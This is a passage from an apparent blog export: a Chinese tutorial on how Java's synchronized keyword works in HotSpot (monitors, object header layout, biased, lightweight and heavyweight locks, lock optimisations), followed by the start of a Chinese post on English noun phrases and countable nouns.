reversing order // We also reverse the order of the list. ObjectWaiter * s = NULL ; ObjectWaiter * t = w ; ObjectWaiter * u = NULL ; while (t != NULL) { guarantee (t-&gt;TState == ObjectWaiter::TS_CXQ, &quot;invariant&quot;) ; t-&gt;TState = ObjectWaiter::TS_ENTER ; u = t-&gt;_next ; t-&gt;_prev = u ; t-&gt;_next = s ; s = t; t = u ; } _EntryList = s ; assert (s != NULL, &quot;invariant&quot;) ; } else { // QMode == 0 or QMode == 2 _EntryList = w ; ObjectWaiter * q = NULL ; ObjectWaiter * p ; for (p = w ; p != NULL ; p = p-&gt;_next) { guarantee (p-&gt;TState == ObjectWaiter::TS_CXQ, &quot;Invariant&quot;) ; p-&gt;TState = ObjectWaiter::TS_ENTER ; p-&gt;_prev = q ; q = p ; } } // In 1-0 mode we need: ST EntryList; MEMBAR #storestore; ST _owner = NULL // The MEMBAR is satisfied by the release_store() operation in ExitEpilog(). // See if we can abdicate to a spinner instead of waking a thread. // A primary goal of the implementation is to reduce the // context-switch rate. if (_succ != NULL) continue; w = _EntryList ; if (w != NULL) { guarantee (w-&gt;TState == ObjectWaiter::TS_ENTER, &quot;invariant&quot;) ; ExitEpilog (Self, w) ; return ; } }} 退出同步代码块时会让_recursions减1，当_recursions的值减为0时，说明线程释放了锁。 根据不同的策略(由QMode指定)，从cxq或EntryList中获取头节点，通过ObjectMonitor::ExitEpilog 方法唤醒该节点封装的线程，唤醒操作最终由unpark完成，实现如下: void ObjectMonitor::ExitEpilog (Thread * Self, ObjectWaiter * Wakee) { assert (_owner == Self, &quot;invariant&quot;) ; // Exit protocol: // 1. ST _succ = wakee // 2. membar #loadstore|#storestore; // 2. ST _owner = NULL // 3. unpark(wakee) _succ = Knob_SuccEnabled ? Wakee-&gt;_thread : NULL ; ParkEvent * Trigger = Wakee-&gt;_event ; // Hygiene -- once we've set _owner = NULL we can't safely dereference Wakee again. // The thread associated with Wakee may have grabbed the lock and &quot;Wakee&quot; may be // out-of-scope (non-extant). Wakee = NULL ; // Drop the lock OrderAccess::release_store_ptr (&amp;_owner, NULL) ; OrderAccess::fence() ; // ST _owner vs LD in unpark() if (SafepointSynchronize::do_call_back()) { TEVENT (unpark before SAFEPOINT) ; } DTRACE_MONITOR_PROBE(contended__exit, this, object(), Self); // 唤醒之前被pack()挂起的线程 Trigger-&gt;unpark() ; // Maintain stats and report events to JVMTI if (ObjectMonitor::_sync_Parks != NULL) { ObjectMonitor::_sync_Parks-&gt;inc() ; }} 被唤醒的线程，会回到EnterI方法中的继续执行monitor的竞争。 for (;;) { if (TryLock (Self) &gt; 0) break ; assert (_owner != Self, &quot;invariant&quot;) ; if ((SyncFlags &amp; 2) &amp;&amp; _Responsible == NULL) { Atomic::cmpxchg_ptr (Self, &amp;_Responsible, NULL) ; } // park self if (_Responsible == Self || (SyncFlags &amp; 1)) { TEVENT (Inflated enter - park TIMED) ; Self-&gt;_ParkEvent-&gt;park ((jlong) RecheckInterval) ; // Increase the RecheckInterval, but clamp the value. RecheckInterval *= 8 ; if (RecheckInterval &gt; 1000) RecheckInterval = 1000 ; } else { TEVENT (Inflated enter - park UNTIMED) ; Self-&gt;_ParkEvent-&gt;park() ; } if (TryLock(Self) &gt; 0) break ; ...} monitor是重量级锁可以看到ObjectMonitor的函数调用中会涉及到Atomic::cmpxchg_ptr，Atomic::inc_ptr等内核函数， 执行同步代码块，没有竞争到锁的对象会park()被挂起，竞争到锁的线程会unpark()唤醒。这个时候就 会存在操作系统用户态和内核态的转换，这种切换会消耗大量的系统资源。所以synchronized是Java语 言中是一个重量级(Heavyweight)的操作。 用户态和和内核态是什么东西呢?要想了解用户态和内核态还需要先了解一下Linux系统的体系架构: 从上图可以看出，Linux操作系统的体系架构分为:用户空间(应用程序的活动空间)和内核。 内核：本质上可以理解为一种软件，控制计算机的硬件资源，并提供上层应用程序运行的环境。 用户空间：上层应用程序活动的空间。应用程序的执行必须依托于内核提供的资源，包括CPU资源、存 储资源、I/O资源等。 系统调用：为了使上层应用能够访问到这些资源，内核必须为上层应用提供访问的接口:即系统调用。 所有进程初始都运行于用户空间，此时即为用户运行状态(简称:用户态);但是当它调用系统调用执行某些操作时，例如 I/O调用，此时需要陷入内核中运行，我们就称进程处于内核运行态(或简称为内 核态)。 系统调用的过程可以简单理解为： 用户态程序将一些数据值放在寄存器中， 或者使用参数创建一个堆栈， 以此表明需要操作系统提 供的服务。 用户态程序执行系统调用。 CPU切换到内核态，并跳到位于内存指定位置的指令。 系统调用处理器(system call handler)会读取程序放入内存的数据参数，并执行程序请求的服务。 系统调用完成后，操作系统会重置CPU为用户态并返回系统调用的结果。由此可见用户态切换至内核态需要传递许多变量，同时内核还需要保护好用户态在切换时的一些寄存器 值、变量等，以备内核态切换回用户态。这种切换就带来了大量的系统资源消耗，这就是在 synchronized未优化之前，效率低的原因。 JVM 对 synchronzied 底层优化高效并发是从JDK 5到JDK 6的一个重要改进，HotSpot虛拟机开发团队在这个版本上花费了大量的精力去实现各种锁优化技术，包括偏向锁( Biased Locking )、轻量级锁( Lightweight Locking )和如适应性自旋(Adaptive Spinning)、锁消除( Lock Elimination)、锁粗化( Lock Coarsening )等，这些技术都是为 了在线程之间更高效地共享数据，以及解决竞争问题，从而提高程序的执行效率。 具体源码分析推荐看这几篇文章：死磕Synchronized底层实现 CASCAS 全称是 compare and swap，是一种用于在多线程环境下实现同步功能的机制。CAS 操作包含三个操作数：内存位置、预期数值和新值。CAS 的实现逻辑是将内存位置处的数值与预期数值想比较，若相等，则将内存位置处的值替换为新值。若不相等，则不做任何操作。 在 Java 中，Java 并没有直接实现 CAS，CAS 相关的实现是通过 C++ 内联汇编的形式实现的，Java 代码需通过 JNI 才能调用。 CAS实现并发，我们先看一段代码： public class AtomicTest { private static AtomicInteger atomicInteger = new AtomicInteger(); public static void main(String[] args) throws InterruptedException { Runnable r = () -&gt; { for (int i = 0; i &lt; 1000; i++) { atomicInteger.incrementAndGet(); } }; for (int i = 0; i &lt; 10; i++) { new Thread(r).start(); } Thread.sleep(1000); System.out.println(atomicInteger.get()); // 输出 10000 }} 底层是调用 jdk.internal.misc.Unsafe#getAndAddInt 这个方法 JAVA对象布局当一个线程尝试访问 synchronized 修饰的代码块时，它首先要获得锁，那么 这个锁到底存在哪里呢？ 是存在锁对象的对象头里。 java对象布局 JOL（java object layout）描述对象在堆内存的布局，如图所示： markword： 固定长度8字节，描述对象的 identityhashcode、GC分代年龄、锁的状态标志、线程持有的锁、偏向锁的线程ID和偏向时间戳等等； klasspoint： 固定长度4字节, 指定该对象的class类对象（默认使用-XX:+UseCompressedClassPointers 参数进行压缩，可使用-XX:-UseCompressedClassPointers关闭，则该字段在64位jvm下占用8个字节；可使用java -XX:+PrintCommandLineFlags -version 命令查看默认的或已设置的jvm参数）； 基本变量：用于存放java八种基本类型成员变量，以4字节步长进行补齐，使用内存重排序优化空间； 引用变量：存放对象地址，如String，Object；占用4个字节，64位jvm上默认使用-XX:+UseCompressedOops进行压缩，可使用-XX:-UseCompressedOops进行关闭，则在64位jvm上会占用8个字节； 补齐：对象大小必须是8字节的整数倍，用来补齐字节数。Object o = new Object() 在内存中占用16个字节，其中最后4个是补齐； 数组长度：如果是数组，额外占用固定4字节存放数组长度； jol-core 是 openjdk的一个工具，他可以很方便的让我看到一个对象的布局。 &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.openjdk.jol&lt;/groupId&gt; &lt;artifactId&gt;jol-core&lt;/artifactId&gt; &lt;version&gt;0.10&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 我们查看一下对象和数组 public class HeaderTest { public static void main(String[] args) { Object o = new Object(); System.out.println(ClassLayout.parseInstance(o).toPrintable()); System.out.println(&quot;===================&quot;); int[] arr = new int[1]; System.out.println(ClassLayout.parseInstance(arr).toPrintable()); }} 打印结果 java.lang.Object object internals: OFFSET SIZE TYPE DESCRIPTION VALUE 0 4 (object header) 05 00 00 00 (00000101 00000000 00000000 00000000) (5) 4 4 (object header) 00 00 00 00 (00000000 00000000 00000000 00000000) (0) 8 4 (object header) 00 10 00 00 (00000000 00010000 00000000 00000000) (4096) 12 4 (loss due to the next object alignment)Instance size: 16 bytesSpace losses: 0 bytes internal + 4 bytes external = 4 bytes total===================[I object internals: OFFSET SIZE TYPE DESCRIPTION VALUE 0 4 (object header) 01 00 00 00 (00000001 00000000 00000000 00000000) (1) 4 4 (object header) 00 00 00 00 (00000000 00000000 00000000 00000000) (0) 8 4 (object header) 10 0c 00 00 (00010000 00001100 00000000 00000000) (3088) 12 4 (object header) 01 00 00 00 (00000001 00000000 00000000 00000000) (1) 16 4 int [I.&lt;elements&gt; N/A 20 4 (loss due to the next object alignment)Instance size: 24 bytesSpace losses: 0 bytes internal + 4 bytes external = 4 bytes total HotSpot采用instanceOopDesc和arrayOopDesc来描述对象头，arrayOopDesc对象用来描述数组类 型。instanceOopDesc的定义的在Hotspot源码的 instanceOop.hpp 文件中，另外，arrayOopDesc 的定义对应 arrayOop.hpp 。 class instanceOopDesc : public oopDesc { public: // aligned header size. static int header_size() { return sizeof(instanceOopDesc)/HeapWordSize; } // If compressed, the offset of the fields of the instance may not be aligned. static int base_offset_in_bytes() { return UseCompressedOops ? klass_gap_offset_in_bytes() : sizeof(instanceOopDesc); } static bool contains_field_offset(int offset, int nonstatic_field_size) { int base_in_bytes = base_offset_in_bytes(); return (offset &gt;= base_in_bytes &amp;&amp; (offset-base_in_bytes) &lt; nonstatic_field_size * heapOopSize); }}; 从instanceOopDesc代码中可以看到 instanceOopDesc继承自oopDesc，oopDesc的定义载Hotspot 源码中的 oop.hpp 文件中。 class oopDesc { friend class VMStructs; private: volatile markOop _mark; union _metadata { wideKlassOop _klass; narrowOop _compressed_klass; } _metadata; ... } 在普通实例对象中，oopDesc的定义包含两个成员，分别是 _mark 和 _metadata。 _mark 表示对象标记、属于markOop类型，也就是接下来要讲解的Mark World，它记录了对象和锁有关的信息。 _metadata 表示类元信息，类元信息存储的是对象指向它的类元数据(Klass)的首地址，其中Klass表示普通指针、 _compressed_klass 表示压缩类指针。 对象头由两部分组成，一部分用于存储自身的运行时数据，称之为 Mark Word，另外一部分是类型指针，及对象指向它的类元数据的指针。 我们看一下markOop.hpp 中对的描述： // 64 bits:// --------// unused:25 hash:31 --&gt;| unused:1 age:4 biased_lock:1 lock:2 (normal object)// JavaThread*:54 epoch:2 unused:1 age:4 biased_lock:1 lock:2 (biased object)// PromotedObject*:61 ---------------------&gt;| promo_bits:3 -----&gt;| (CMS promoted object)// size:64 -----------------------------------------------------&gt;| (CMS free block)//// unused:25 hash:31 --&gt;| cms_free:1 age:4 biased_lock:1 lock:2 (COOPs &amp;&amp; normal object)// JavaThread*:54 epoch:2 cms_free:1 age:4 biased_lock:1 lock:2 (COOPs &amp;&amp; biased object)// narrowOop:32 unused:24 cms_free:1 unused:4 promo_bits:3 -----&gt;| (COOPs &amp;&amp; CMS promoted object)// unused:21 size:35 --&gt;| cms_free:1 unused:7 ------------------&gt;| (COOPs &amp;&amp; CMS free block)//// - hash contains the identity hash value: largest value is// 31 bits, see os::random(). Also, 64-bit vm's require// a hash value no bigger than 32 bits because they will not// properly generate a mask larger than that: see library_call.cpp// and c1_CodePatterns_sparc.cpp.//// - the biased lock pattern is used to bias a lock toward a given// thread. When this pattern is set in the low three bits, the lock// is either biased toward a given thread or &quot;anonymously&quot; biased,// indicating that it is possible for it to be biased. When the// lock is biased toward a given thread, locking and unlocking can// be performed by that thread without using atomic operations.// When a lock's bias is revoked, it reverts back to the normal// locking scheme described below.//// Note that we are overloading the meaning of the &quot;unlocked&quot; state// of the header. Because we steal a bit from the age we can// guarantee that the bias pattern will never be seen for a truly// unlocked object.//// Note also that the biased state contains the age bits normally// contained in the object header. Large increases in scavenge// times were seen when these bits were absent and an arbitrary age// assigned to all biased objects, because they tended to consume a// significant fraction of the eden semispaces and were not// promoted promptly, causing an increase in the amount of copying// performed. The runtime system aligns all JavaThread* pointers to// a very large value (currently 128 bytes (32bVM) or 256 bytes (64bVM))// to make room for the age bits &amp; the epoch bits (used in support of// biased locking), and for the CMS &quot;freeness&quot; bit in the 64bVM (+COOPs).//// [JavaThread* | epoch | age | 1 | 01] lock is biased toward given thread// [0 | epoch | age | 1 | 01] lock is anonymously biased//// - the two lock bits are used to describe three states: locked/unlocked and monitor.//// [ptr | 00] locked ptr points to real header on stack// [header | 0 | 01] unlocked regular object header// [ptr | 10] monitor inflated lock (header is wapped out)// [ptr | 11] marked used by markSweep to mark an object// not valid at any other time 根据下面图理解 以及 无锁先打印一下，如果我们不调用 hashCode 在markword上是不会显示 public class HeaderTest { public static void main(String[] args) { Object o = new Object(); System.out.println(Integer.toHexString(o.hashCode())); System.out.println(ClassLayout.parseInstance(o).toPrintable()); }} 打印结果 hashCode: 2d209079OFFSET SIZE TYPE DESCRIPTION VALUE 0 4 (object header) 01 79 90 20 (00000001 01111001 10010000 00100000) (546339073) 4 4 (object header) 2d 00 00 00 (00101101 00000000 00000000 00000000) (45) 8 4 (object header) 00 10 00 00 (00000000 00010000 00000000 00000000) (4096) 12 4 (loss due to the next object alignment) x86都是使用的小端模式，我们转为大端显示更直观一些 我们看最后三位为 001 表示无锁。 其中 hashCode [0 00101101 00100000 10010000 01111001]转换类 16 进制为 0x2d209079。 分代年龄为 4 位，说明 JVM 回收最大存活为 15 代。 小端 00000001 01111001 10010000 00100000 00101101 00000000 00000000 00000000大端 00000000 00000000 00000000 00101101 00100000 10010000 01111001 00000001[00000000 00000000 0000000][0 00101101 00100000 10010000 01111001] [0][0000][0][01] 未使用 hashCode cms_free 分代年龄 偏向锁 锁标志 偏向锁偏向锁是JDK 6中的重要引进，因为HotSpot作者经过研究实践发现，在大多数情况下，锁不仅不存在多线程竞争，而且总是由同一线程多次获得，为了让线程获得锁的代价更低，引进了偏向锁。 偏向锁的“偏”，就是偏心的“偏”、偏袒的“偏”，它的意思是这个锁会偏向于第一个获得它的线程，会在对象头存储锁偏向的线程ID，以后该线程进入和退出同步块时只需要检查是否为偏向锁、锁标志位以及 ThreadID 即可。 当锁对象第一次被线程获取的时候，虚拟机将会把对象头中的标志位设为“01”，即偏向模式。同时使用CAS操 作把获取到这个锁的线程的ID记录在对象的Mark Word之中 ，如果CAS操作成功，持有偏向锁的线程以后每 次进入这个锁相关的同步块时，虚拟机都可以不再进行任何同步操作，偏向锁的效率高。 偏向锁是在只有一个线程执行同步块时进一步提高性能，适用于一个线程反复获得同一锁的情况。偏向锁可以 提高带有同步但无竞争的程序性能。 偏向锁在Java 6之后是默认启用的，但在应用程序启动几秒钟之后才激活（因为刚启动程序内部一般会有多个竞争），当然可以使用-XX:BiasedLockingStartupDelay=0参数关闭延迟，如果确定应用程序中所有锁通常情况下处于竞争状态，可以通过 -XX:UseBiasedLocking=false参数关闭偏向锁。 public class HeaderTest { public static void main(String[] args) throws InterruptedException { // 等待虚拟机开启偏向锁 Thread.sleep(5000); Object o = new Object(); System.out.println(ClassLayout.parseInstance(o).toPrintable()); synchronized (o) { System.out.println(ClassLayout.parseInstance(o).toPrintable()); } }} 打印结果： java.lang.Object object internals: OFFSET SIZE TYPE DESCRIPTION VALUE 0 4 (object header) 05 00 00 00 (00000101 00000000 00000000 00000000) (5) 4 4 (object header) 00 00 00 00 (00000000 00000000 00000000 00000000) (0) 8 4 (object header) 00 10 00 00 (00000000 00010000 00000000 00000000) (4096) 12 4 (loss due to the next object alignment)Instance size: 16 bytesSpace losses: 0 bytes internal + 4 bytes external = 4 bytes totaljava.lang.Object object internals: OFFSET SIZE TYPE DESCRIPTION VALUE 0 4 (object header) 05 a0 00 a6 (00000101 10100000 00000000 10100110) (-1509908475) 4 4 (object header) bb 7f 00 00 (10111011 01111111 00000000 00000000) (32699) 8 4 (object header) 00 10 00 00 (00000000 00010000 00000000 00000000) (4096) 12 4 (loss due to the next object alignment)Instance size: 16 bytesSpace losses: 0 bytes internal + 4 bytes external = 4 bytes total 第一次打印为匿名偏向，第二次偏向锁指向了main 线程，第一个线程ID为0，第二有线程ID。 匿名偏向：小端 00000101 00000000 00000000 00000000 00000000 00000000 00000000 00000000大端 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000101[00000000 00000000 00000000 00000000 00000000 00000000 000000][00] [00000][1][01] 线程ID 偏向时间戳 cms_free 分代年龄 偏向锁 锁标志偏向main线程：小端 00000101 10100000 00000000 10100110 10111011 01111111 00000000 00000000大端 00000000 00000000 01111111 10111011 10100110 00000000 10100000 00000101[00000000 00000000 01111111 10111011 10100110 00000000 101000][00] [0][0000][1][01] 线程ID 偏向时间戳 cms_free 分代年龄 偏向锁 锁标志 轻量级锁轻量级锁是JDK 6之中加入的新型锁机制，它名字中的“轻量级”是相对于使用monitor的传统锁而言的，因此传统的锁机制就称为“重量级”锁。首先需要强调一点的是，轻量级锁并不是用来代替重量级锁的。 引入轻量级锁的目的：在多线程交替执行同步块的情况下，尽量避免重量级锁引起的性能消耗，但是如 果多个线程在同一时刻进入临界区，会导致轻量级锁膨胀升级重量级锁，所以轻量级锁的出现并非是要 替代重量级锁。 当关闭偏向锁功能或者多个线程竞争偏向锁导致偏向锁升级为轻量级锁，则会尝试获取轻量级锁，其步骤如下: 判断当前对象是否处于无锁状态，如果是，则JVM首先将在当前线程的栈帧中建立一个名为锁记录（Lock Record）的空间，用于存储锁对象目前的 Mark Word 的拷贝（官方把这份拷贝加了一个 Displaced 前缀，即 Displaced Mark Word），将对象的 Mark Word 复制到栈帧中的 Lock Record 中，将 Lock Reocrd 中的 owner 指向当前对象。 JVM利用 CAS 操作尝试将对象的 Mark Word 更新为指向 Lock Record 的指针，如果成功表示竞争到锁，则将锁标志位变成 00，执行同步操作。 如果失败则判断当前对象的Mark Word是否指向当前线程的栈帧，如果是则表示当前线程已经持有当前对象的锁，则直接执行同步代码块；否则只能说明该锁对象已经被其他线程抢占了，这时轻 量级锁需要膨胀为重量级锁，锁标志位变成10，后面等待的线程将会进入阻塞状态。 轻量级锁CAS操作之前堆栈与对象的状态 轻量级锁CAS操作之后堆栈与对象的状态 public class HeaderTest { public static void main(String[] args) throws InterruptedException { // 等待虚拟机开启偏向锁 Thread.sleep(5000); Object o = new Object(); synchronized (o) { System.out.println(ClassLayout.parseInstance(o).toPrintable()); } new Thread(() -&gt; { synchronized (o) { System.out.println(ClassLayout.parseInstance(o).toPrintable()); } }).start(); }} 打印结果： java.lang.Object object internals: OFFSET SIZE TYPE DESCRIPTION VALUE 0 4 (object header) 05 c8 00 2f (00000101 11001000 00000000 00101111) (788580357) 4 4 (object header) d7 7f 00 00 (11010111 01111111 00000000 00000000) (32727) 8 4 (object header) 00 10 00 00 (00000000 00010000 00000000 00000000) (4096) 12 4 (loss due to the next object alignment)Instance size: 16 bytesSpace losses: 0 bytes internal + 4 bytes external = 4 bytes totaljava.lang.Object object internals: OFFSET SIZE TYPE DESCRIPTION VALUE 0 4 (object header) 00 5a a9 03 (00000000 01011010 10101001 00000011) (61430272) 4 4 (object header) 00 70 00 00 (00000000 01110000 00000000 00000000) (28672) 8 4 (object header) 00 10 00 00 (00000000 00010000 00000000 00000000) (4096)Instance size: 16 bytesSpace losses: 0 bytes internal + 4 bytes external = 4 bytes total 发现从偏向锁转为轻量级锁 偏向锁：大端 00000101 11001000 00000000 00101111 11010111 01111111 00000000 00000000小端 00000000 00000000 01111111 11010111 00101111 00000000 11001000 00000101轻量级锁：大端 00000000 01011010 10101001 00000011 00000000 01110000 00000000 00000000小端 00000000 00000000 01110000 00000000 00000011 10101001 01011010 00000000[00000000 00000000 01110000 00000000 00000011 10101001 01011010 000000][00] 指向轻量级锁指针 锁标志 重量级锁public class HeaderTest { public static void main(String[] args) throws InterruptedException { // 等待虚拟机开启偏向锁 Thread.sleep(5000); Object o = new Object(); synchronized (o) { System.out.println(ClassLayout.parseInstance(o).toPrintable()); } new Thread(() -&gt; { synchronized (o) { System.out.println(ClassLayout.parseInstance(o).toPrintable()); } }).start(); Thread.sleep(1000); for (int i = 0; i &lt; 2; i++) { new Thread(() -&gt; { synchronized (o) { System.out.println(ClassLayout.parseInstance(o).toPrintable()); } }).start(); } Thread.sleep(1000); }} 展示了从偏向锁（101）-&gt; 轻量级锁（000）-&gt; 重量级锁（010） java.lang.Object object internals: OFFSET SIZE TYPE DESCRIPTION VALUE 0 4 (object header) 05 90 80 33 (00000101 10010000 10000000 00110011) (864063493) 4 4 (object header) fc 7f 00 00 (11111100 01111111 00000000 00000000) (32764) 8 4 (object header) 00 10 00 00 (00000000 00010000 00000000 00000000) (4096) 12 4 (loss due to the next object alignment)Instance size: 16 bytesSpace losses: 0 bytes internal + 4 bytes external = 4 bytes totaljava.lang.Object object internals: OFFSET SIZE TYPE DESCRIPTION VALUE 0 4 (object header) 00 3a d6 06 (00000000 00111010 11010110 00000110) (114702848) 4 4 (object header) 00 70 00 00 (00000000 01110000 00000000 00000000) (28672) 8 4 (object header) 00 10 00 00 (00000000 00010000 00000000 00000000) (4096) 12 4 (loss due to the next object alignment)Instance size: 16 bytesSpace losses: 0 bytes internal + 4 bytes external = 4 bytes totaljava.lang.Object object internals: OFFSET SIZE TYPE DESCRIPTION VALUE 0 4 (object header) 02 3f 21 33 (00000010 00111111 00100001 00110011) (857816834) 4 4 (object header) fc 7f 00 00 (11111100 01111111 00000000 00000000) (32764) 8 4 (object header) 00 10 00 00 (00000000 00010000 00000000 00000000) (4096) 12 4 (loss due to the next object alignment)Instance size: 16 bytesSpace losses: 0 bytes internal + 4 bytes external = 4 bytes totaljava.lang.Object object internals: OFFSET SIZE TYPE DESCRIPTION VALUE 0 4 (object header) 02 3f 21 33 (00000010 00111111 00100001 00110011) (857816834) 4 4 (object header) fc 7f 00 00 (11111100 01111111 00000000 00000000) (32764) 8 4 (object header) 00 10 00 00 (00000000 00010000 00000000 00000000) (4096) 12 4 (loss due to the next object alignment)Instance size: 16 bytesSpace losses: 0 bytes internal + 4 bytes external = 4 bytes total 自旋锁轻量级锁失败后，虚拟机为了避免线程真实地在操作系统层面挂起，还会进行一项称为自旋锁的优化手段。 自旋锁：许多情况下，共享数据的锁定状态持续时间较短，切换线程不值得，通过让线程执行循环等待锁的释放，不让出CPU。如果得到锁，就顺利进入临界区。如果还不能获得锁，那就会将线程在操作系统层面挂起，这就是自旋锁的优化方式。但是它也存在缺点：如果锁被其他线程长时间占用，一直不释放CPU，会带来许多的性能开销。 自适应自旋锁：这种相当于是对上面自旋锁优化方式的进一步优化，它的自旋的次数不再固定，其自旋的次数由前一次在同一个锁上的自旋时间及锁的拥有者的状态来决定，这就解决了自旋锁带来的缺点。 锁消除锁消除是指虚拟机即时编译器(JIT)在运行时，对一些代码上要求同步，但是被检测到不可能存在共享 数据竞争的锁进行消除。锁消除的主要判定依据来源于逃逸分析的数据支持，如果判断在一段代码中， 堆上的所有数据都不会逃逸出去从而被其他线程访问到，那就可以把它们当做栈上数据对待，认为它们 是线程私有的，同步加锁自然就无须进行。变量是否逃逸，对于虚拟机来说需要使用数据流分析来确 定，但是程序员自己应该是很清楚的，怎么会在明知道不存在数据争用的情况下要求同步呢?实际上有 许多同步措施并不是程序员自己加入的，同步的代码在Java程序中的普遍程度也许超过了大部分读者的想象。下面这段非常简单的代码仅仅是输出3个字符串相加的结果，无论是源码字面上还是程序语义上 都没有同步。 public class Demo { public static void main(String[] args) { contactString(&quot;aa&quot;, &quot;bb&quot;, &quot;cc&quot;); } public static String contactString(String s1, String s2, String s3) { return new StringBuffer().append(s1).append(s2).append(s3).toString(); }} StringBuffer的append ( ) 是一个同步方法，锁就是this也就是(new StringBuilder())。虚拟机发现它的 动态作用域被限制在concatString( )方法内部。也就是说, new StringBuilder()对象的引用永远不会“逃 逸”到concatString ( )方法之外，其他线程无法访问到它，因此，虽然这里有锁，但是可以被安全地消除 掉，在即时编译之后，这段代码就会忽略掉所有的同步而直接执行了。 锁粗化原则上，我们在编写代码的时候，总是推荐将同步块的作用范围限制得尽量小，只在共享数据的实际作 用域中才进行同步，这样是为了使得需要同步的操作数量尽可能变小，如果存在锁竞争，那等待锁的线 程也能尽快拿到锁。大部分情况下，上面的原则都是正确的，但是如果一系列的连续操作都对同一个对 象反复加锁和解锁，甚至加锁操作是出现在循环体中的，那即使没有线程竞争，频繁地进行互斥同步操 作也会导致不必要的性能损耗。 public class Demo { public static void main(String[] args) { StringBuffer sb = new StringBuffer(); for (int i = 0; i &lt; 100; i++) { sb.append(&quot;aa&quot;); } System.out.println(sb.toString()); }} JVM会探测到一连串细小的操作都使用同一个对象加锁，将同步代码块的范围放大， 放到这串操作的外面，这样只需要加一次锁即可。 写在最后我看很很多视频和文章整理出来的比较，synchronized比较难，涉及到的知识特别多，包括并发、字节码、JVM、汇编以及计算机系统等。在 Java 1.6 以后 JVM 对 synchronized 进行了优化，存在偏向锁、轻量级锁和重量级锁等形式，尤其是锁的锁的升级和降级比较复杂，现在我们回过头再看看这张图，就很容易看懂了。 参考 Java面试热点问题，synchronized原理剖析与优化 死磕Synchronized底层实现 Java对象布局 深入理解 Java 虚拟机之对象的内存布局","link":"/2020/09/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3synchronized%E5%85%B3%E9%94%AE%E5%AD%97/"},{"title":"英语语法新思维（一）","text":"名词短语名称短语是由名词和和它的修饰语一起构成的。名词的修饰语与名词的位置关系有两种。 一是放在被修饰名称的前面，称为前置定语或定语 二是放在修饰名词的后面，我们称为后置定语 名词短语的构造：“左二右六”的定律规律 限定词 + 形容词 + 中心名词 + 六类右置定语（介词短语、分词短语、不定式短语、形容词短语、定语从句、同位语从句） 看以下例子： The boy is my brother. 限定词 + 中心名词 The cute boy is my brother. 限定词 + 形容词 + 中心名词 The cute boy in blue jeans is my brother. 限定词 + 形容词 + 中心名词 + 介词短语 The cute boy wearing blue jeans is my brother. 限定词 + 形容词 + 中心名词 + 分词短语 The cute boy who is wearing blue jeans is my brother. 限定词 + 形容词 + 中心名词 + 定语从句 名词名词的定义与分类名词的定义：名词用来表示人、事物、地点以及抽象事物的名称。比如： 人：John, sister, father 事物：water, air, sun, computer 地点：London, theater 抽象事物：love, happiness, imagination, hope 名词的分类： 专有名词：表示特定的人、物、机构或者场所（Paris, the United State） 普通名词 可数名词 个体名词：表示同类中的人或事物中的个体（student, tree, house, piano） 集体名词：表示若干人或事物的总称（team, commitee, police, family） 不可数名词 物质名词：表示物质和材料的总称（paper, water, cotton, air） 抽象名词：表示动作、性质、状态或情感等抽象概念的名词（birth, happiness, evolution, technogy, management, imagination, hope, sport） 可数与不可数名词的可数性重在的意义不是形式，与使用的语境有关，意义和语境的不同会导致名词的可数性质不同。 规律一：对于物质名词的总称的名词，若表示不同的总类，或者特定的意思，或者液体表示“几杯”或“几瓶”这样的数量，则转化为可数名词。 如： cake 用作蛋糕这类物质总称是不可数，表示一快蛋糕是可数。 I like cake, not hamburger. My mother is making a cake in the kitchen. paper I need some paper to write a letter on. I have a term paper to write on weekends. (学期论文) I bought a paper. glass 表示玻璃不可数，表示玻璃杯可数 Glass dose not rust or rot.（玻璃不会生锈也不会腐烂） She drank two glasses of wine. （她喝了两杯葡萄酒） He broke a glass. (他打碎了一个玻璃杯) He broke a pice of glass. (他打碎了一片玻璃) 不可数名称，只能用 a pice of glass He broke a pair of glasses.（他打碎了一幅眼镜） 规律二：对于抽象名词，若是具体化了，则转化为可数名词。并且，此时往往伴随着词意上或大或小的改变。 art（艺术）/ an art（一项技术） beauty（美丽）/ a beauty（一个美人） She had great beauty in her youth.（他年轻的时候非常美丽） She was a beauty in her youth.（她年轻的时候是个美人） youth（青春）/ a youth（一个年轻人） 规律三：从广泛的意义来说，当一个名词表示抽象的、总称的概念时，一般作为不可数名词。（husband and wife）。当它表示具体的、特定的事物一般作为不可数名词。 husband and wife I pronounce this couple to be husband and wife. You may kiss.（不可数） area 如果是指某个地方具体多大面试则是可数 The square covers an area of 20,000 square meters. （这个广场的面试达两万平方米） ShangHai is the largest city in area in China, but BeiJing is the largest city in population. 不可数名词的度量1、不可数名词与量词 虽然我们不能用具体的数字（比如：one, two, thress）来表示不可数名词，但是我们可以借用量词来表示。不同的类型的不可数名词使用的量词也不一样，一般的规律如下： 常用 piece 修饰以下的抽象名词和物质名词，比如：advice, bread, baggage, chalk, equiment, furniture, information, luggage, music, news a piece of news（一条消息） two pieces of news（两条消息） several pieces of furniture（几件家具） three pieces of luggage（三件行李） 用 bottle, cup, drop 和 glass 修饰液体物质，比如：beer, blood, coffee, milk, tea, water, wink several drops of blood（几滴血） a glass of milk（一杯牛奶） two glasses of wink（两杯葡萄酒） two cups of coffee（两杯咖啡） 其他量词 a loaf of bread（一长条面包） a tube of toothpaste（一筒牙膏） a slice of meat（一片肉） 2、不可数名词不能被 a(n) 修饰 除了不能被量词修饰意外，不可数名词一般不能直接被不定冠词 a/an 修饰。比如一条消息不能说 a news，应该说 a piece of news。 3、不可数名词不能被基数词修饰 可数名词可以数出具体数目，因此可以被基数词修饰，比如 one book 或者 two books等。比如两天修饰不能说 two news，应该说 two pieces of news。 单数和复数不可数名词只有单数形式，没有复数形式；可数名词既有单数形式又有复数形式，两套形式通常不同。 1、只用做复数的名词 二和一的复数名词：这些名词由相等的两个部分合在一起构成的工具、仪器或服装。 工具仪器：glasses（眼镜）、scales（天平）、tongs（镊子） 服装：jeans（牛仔裤）、trousers（长裤）、short（短裤）、briefs（内裤） 对于这些名词，要说明数量，我们往往要用 pair 来表示 He picked up the hot metal with a pair of tongs. That’s a nice pair of pants. As I’m shortsighted I always carry two pairs of glasses. 2、“单形复意”的名词 有些名词虽然没有复数标记，但用作复数，既形式上是单数但是表达的是复数的意义。 people：作为“人们，人民”的意思，他体现复数形式，person相当于people的单数形式 